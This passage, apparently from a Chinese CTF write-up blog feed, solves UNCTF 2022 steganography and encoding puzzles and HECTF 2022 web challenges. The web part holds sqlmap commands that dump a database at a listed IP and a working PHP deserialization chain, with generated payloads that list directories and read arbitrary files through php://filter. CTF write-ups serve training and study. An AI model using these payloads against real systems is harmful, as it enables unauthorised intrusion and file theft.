class="line">PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y</span><br><span class="line">+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja</span><br><span class="line">Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN</span><br><span class="line">oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T</span><br><span class="line">ljaE=&#125;</span><br></pre></td></tr></table></figure><p>中间部分base64解码得到的 <code>依古比古</code> 换为 <code>.</code>，<code>玛卡巴卡</code> 换为 <code>-</code>，再摩斯密码解得 <code>WAN_AN_MAKA_BAKAAAAA!</code>。</p><p>​    </p><h3 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h3><blockquote><p>小w一直对真人二次元没啥抵抗力，当他见到清和的时候，小w直呼这就是心动的感觉。</p></blockquote><p>第一层，根据压缩包注释，密码为清和B站uid下划线最高播放量视频发布日期，找到密码 <code>836885_2022/05/20</code>；</p><p>第二层，png图片LSB隐写，提取出 <code>password is :qq857488580</code>；</p><p>第三层，音频文件SSTV，得到图片中密码 <code>V@mpir3</code>；</p><p>最后一层，文本内零宽隐写，用在线工具提取得到 <code>unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;</code>。</p><p>​    </p><h3 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h3><p>带密码的LSB隐写：<code>python2 lsb.py extract flag.png xxx.txt key1</code></p><p>flag: <code>flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;</code></p><p>​    </p><h3 id="我小心海也绝非鳝类"><a href="#我小心海也绝非鳝类" class="headerlink" title="我小心海也绝非鳝类"></a>我小心海也绝非鳝类</h3><p>png图片中有字符串 <code>F#S&lt;YIcHnAG;</code>，base92解码 <code>flaginmd5</code>；尾部 <code>RUFTWUxTQg==</code>，base64解码 <code>EASYLSB</code>。</p><p>zsteg查看不到有用信息，用cloaked-pixel带密码的LSB提取：<code>python2 lsb.py extract 1.png out.txt flaginmd5</code>，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><p>根据前面的提示，这串字符串为md5值的组合，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#xx27;</span>.lower()</span><br><span class="line">s = [s[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;welcome_to_misc&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>将dat文件异或0x8e，解压得到encode.py，内为图片加密算法，逻辑为逐像素RGB值简单异或，还原即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">c = Image.<span class="built_in">open</span>(<span class="string">r&#x27;flag.png&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h = c.size</span><br><span class="line"><span class="built_in">print</span>(l,h)</span><br><span class="line">m = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">      r1,g1,b1 = c.getpixel((i,j))</span><br><span class="line">      r = g1^b1</span><br><span class="line">      g = r1^r</span><br><span class="line">      b = g1^g</span><br><span class="line">      m.putpixel(((i*<span class="number">1200</span>+j)//<span class="number">787</span>,(i*<span class="number">1200</span>+j)%<span class="number">787</span>),(b,g,r))</span><br><span class="line">m.save(<span class="string">r&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">c.close()</span><br><span class="line">m.close()</span><br></pre></td></tr></table></figure><p>还原图片中的flag：<code>UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;</code>。</p><p>​    </p><h3 id="贝斯家族的侵略"><a href="#贝斯家族的侵略" class="headerlink" title="贝斯家族的侵略"></a>贝斯家族的侵略</h3><blockquote><p>提示1：如果明文攻击失败，尝试使用bandzip</p><p>提示2：会动的鼠标</p></blockquote><p>第一层，根据提示1，bandzip压缩后明文攻击，解压；</p><p>第二层，base64隐写，脚本提取隐写内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line"><span class="keyword">if</span> equalnum:</span><br><span class="line">bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p>得到的内容16进制转字符串，得到一个文件；</p><p>第三层，根据文件内的提示 <code>Macro.mrf</code>，猜测为鼠标轨迹记录，使用Macro Recorder工具打开，逐条查看轨迹得到flag：<code>flag&#123;b4s3_1s_v3ry_g0od!!&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022 HECTF</title>
    <link href="https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/"/>
    <id>https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/</id>
    <published>2022-11-07T13:38:28.000Z</published>
    <updated>2022-11-28T16:24:14.457Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h3><blockquote><p>签到题</p><p>HINTS:</p><p>官网地址需填写完整(建议复制)，无路径即结尾为.cn</p></blockquote><p>进入是迷惑性的404页面，且右键和F12禁用，地址栏手动添加 <code>view-source:</code> 看到源码提示 <code>hectfer</code>。</p><p>访问 <code>/hectfer</code> 提示 <code>hebnu is a good site.</code>，访问 <code>/hebnu</code> 提示 <code>Can you use another way of requesting?</code></p><p>上burpsuite，按提示按步骤修改request header的几处为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hebnu HTTP/1.1</span><br><span class="line">User-Agent: Internet Explorer</span><br><span class="line">Referer: https://www.hebtu.edu.cn</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>在responce header里看到PHPFuck代码，控制台运行直接得到flag：<code>HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;</code>。</p><p>​    </p><h3 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h3><p>找到GET参数id，用sqlmap可以直接通过时间盲注跑出flag。</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，爆表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，表名3eDf4f07efC9ee16，爆列名和内容</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf -T 3eDf4f07efC9ee16 --columns --dump</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><blockquote><p>一道神奇的反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Welcome to HECTF Have fun!!!😊&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file-&gt;var))&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line"> <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;难道我真的要失败了，吗&quot;</span>.<span class="keyword">$this</span>-&gt;str;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;huang-&gt;str;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$eee</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$aaa</span>=<span class="string">&quot;who are you?&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ccc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;eee-&gt;flag();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$css</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;ccc;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ddd</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ext</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;ddd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;ddd(<span class="keyword">$this</span>-&gt;ext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$gagaga</span> = <span class="keyword">new</span> A();</span><br><span class="line">unserialize(serialize(<span class="variable">$gagaga</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>); </span><br></pre></td></tr></table></figure></blockquote><p>构造反序列化链：</p><p><code>A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new()</code></p><p>利用内置类 <code>DirectoryIterator</code> + <code>glob://</code>伪协议列目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;DirectoryIterator&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;glob:///*f*&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload:</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 文件名 /ffflllllaaaaaaggggg.txt</span></span><br></pre></td></tr></table></figure><p>再利用内置类 <code>SplFileObject</code> + <code>php://filter</code>伪协议读文件内容： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;SplFileObject&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span>:</span></span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span></span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># HECTF&#123;u_find_m</span></span><br><span class="line"><span class="comment"># y_trulyself&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h3><p>观察页面，有图片上传点，url发现存在文件包含，利用伪协议读源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 